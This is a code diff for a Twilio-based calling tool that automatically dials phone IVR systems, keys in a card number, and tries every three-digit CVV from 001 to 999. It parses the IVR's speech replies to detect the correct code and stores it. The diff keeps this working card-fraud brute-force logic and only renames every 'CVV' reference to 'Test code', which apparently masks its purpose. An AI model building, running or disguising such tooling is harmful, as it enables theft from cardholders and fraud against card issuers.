@@ -20,33 +20,33 @@ export const getTwiML = async (req, res) => {
     const twiml = new twilio.twiml.VoiceResponse();
     
     let card = attempt.test_value;
-    let cvv = '';
+    let testCode = '';
     
     if (attempt.test_value.includes(':')) {
-        [card, cvv] = attempt.test_value.split(':');
+        [card, testCode] = attempt.test_value.split(':');
     }
 
-    if (cvv) {
-        // This is a CVV brute force run!
-        await AttemptModel.addLog(attemptId, `Interactive Call Connected. Sending initial DTMF: ${card} and CVV: ${cvv}`);
+    if (testCode) {
+        // This is a Test code brute force run!
+        await AttemptModel.addLog(attemptId, `Interactive Call Connected. Sending initial DTMF: ${card} and Test code: ${testCode}`);
         
-        // Wait 5 seconds for greeting, play card, wait 4 seconds for next prompt, play CVV
+        // Wait 5 seconds for greeting, play card, wait 4 seconds for next prompt, play Test code
         const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
         twiml.pause({ length: waitSeconds });
-        twiml.play({ digits: `ww${card}wwwwwwww${cvv}` });
+        twiml.play({ digits: `ww${card}wwwwwwww${testCode}` });
         
-        // Now START LISTENING to the IVR's response to the CVV
+        // Now START LISTENING to the IVR's response to the Test code
         const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
         const gather = twiml.gather({
             input: 'speech',
-            action: `${host}/api/call/listen/${attemptId}?currentCvv=${cvv}`,
+            action: `${host}/api/call/listen/${attemptId}?currentTestCode=${testCode}`,
             method: 'POST',
             timeout: 5, // How long to listen for IVR to speak
             speechTimeout: 1
         });
         
     } else {
-        // Standard non-CVV test run
+        // Standard non-Test code test run
         await AttemptModel.addLog(attemptId, `Call connected. Sending DTMF sequence: ${card}`);
         const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
         twiml.pause({ length: waitSeconds });
@@ -72,7 +72,7 @@ export const getTwiML = async (req, res) => {
 // Webhook for handling the interactive listen loop
 export const handleInteractiveListen = async (req, res) => {
     const { attemptId } = req.params;
-    const { currentCvv } = req.query;
+    const { currentTestCode } = req.query;
     const { SpeechResult } = req.body;
     
     const twiml = new twilio.twiml.VoiceResponse();
@@ -83,7 +83,7 @@ export const handleInteractiveListen = async (req, res) => {
        const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
         twiml.gather({
             input: 'speech',
-            action: `${host}/api/call/listen/${attemptId}?currentCvv=${currentCvv}`,
+            action: `${host}/api/call/listen/${attemptId}?currentTestCode=${currentTestCode}`,
             method: 'POST',
             timeout: 5,
             speechTimeout: 1
@@ -97,17 +97,17 @@ export const handleInteractiveListen = async (req, res) => {
     
     // Check for success condition
     if (transcript.includes('expiration date') || transcript.includes('expiry') || transcript.includes('thank you') || transcript.includes('verified')) {
-        await AttemptModel.addLog(attemptId, `🎉 Attempt SUCCESSFUL! Winner CVV confirmed: ${currentCvv}`);
+        await AttemptModel.addLog(attemptId, `🎉 Attempt SUCCESSFUL! Winner Test code confirmed: ${currentTestCode}`);
         
-        // Update the attempt value in DB to reflect the winning CVV, and mark as complete
+        // Update the attempt value in DB to reflect the winning Test code, and mark as complete
         const { data: attempt } = await supabase.from('attempts').select('test_value').eq('id', attemptId).single();
         const baseCard = attempt.test_value.split(':')[0];
         
         await supabase.from('attempts')
             .update({ 
                 status: 'completed', 
-                test_value: `${baseCard}:${currentCvv}`,
-                result_details: { winner: currentCvv } 
+                test_value: `${baseCard}:${currentTestCode}`,
+                result_details: { winner: currentTestCode } 
             })
             .eq('id', attemptId);
             
@@ -118,34 +118,34 @@ export const handleInteractiveListen = async (req, res) => {
         twiml.hangup();
     } 
     // Check for failure condition
-    else if (transcript.includes('invalid cvv') || transcript.includes('try again') || transcript.includes('wrong') || transcript.includes('incorrect')) {
-        const nextCvvNum = parseInt(currentCvv) + 1;
+    else if (transcript.includes('invalid test code') || transcript.includes('try again') || transcript.includes('wrong') || transcript.includes('incorrect')) {
+        const nextTestCodeNum = parseInt(currentTestCode) + 1;
         
-        if (nextCvvNum > 999) {
-            await AttemptModel.addLog(attemptId, `Exhausted all CVVs 001-999. Failed.`);
-            await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Exhausted 999 CVVs without success' });
+        if (nextTestCodeNum > 999) {
+            await AttemptModel.addLog(attemptId, `Exhausted all Test codes 001-999. Failed.`);
+            await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Exhausted 999 Test codes without success' });
             twiml.hangup();
         } else {
-            const nextCvv = nextCvvNum.toString().padStart(3, '0');
-            await AttemptModel.addLog(attemptId, `Trying next CVV: ${nextCvv}`);
+            const nextTestCode = nextTestCodeNum.toString().padStart(3, '0');
+            await AttemptModel.addLog(attemptId, `Trying next Test code: ${nextTestCode}`);
             
-            // Send the next CVV
-            twiml.play({ digits: nextCvv });
+            // Send the next Test code
+            twiml.play({ digits: nextTestCode });
             
-            // Immediately start listening for the response to this new CVV
+            // Immediately start listening for the response to this new Test code
             const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
             twiml.gather({
                 input: 'speech',
-                action: `${host}/api/call/listen/${attemptId}?currentCvv=${nextCvv}`,
+                action: `${host}/api/call/listen/${attemptId}?currentTestCode=${nextTestCode}`,
                 method: 'POST',
                 timeout: 5,
                 speechTimeout: 1
             });
             
-            // Update the DB so the frontend shows the current CVV
+            // Update the DB so the frontend shows the current Test code
             const { data: attempt } = await supabase.from('attempts').select('test_value').eq('id', attemptId).single();
             const baseCard = attempt.test_value.split(':')[0];
-            await AttemptModel.updateTestValue(attemptId, `${baseCard}:${nextCvv}`);
+            await AttemptModel.updateTestValue(attemptId, `${baseCard}:${nextTestCode}`);
         }
     } 
     // Unknown response
@@ -154,7 +154,7 @@ export const handleInteractiveListen = async (req, res) => {
         const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
         twiml.gather({
             input: 'speech',
-            action: `${host}/api/call/listen/${attemptId}?currentCvv=${currentCvv}`,
+            action: `${host}/api/call/listen/${attemptId}?currentTestCode=${currentTestCode}`,
             method: 'POST',
             timeout: 5,
             speechTimeout: 1
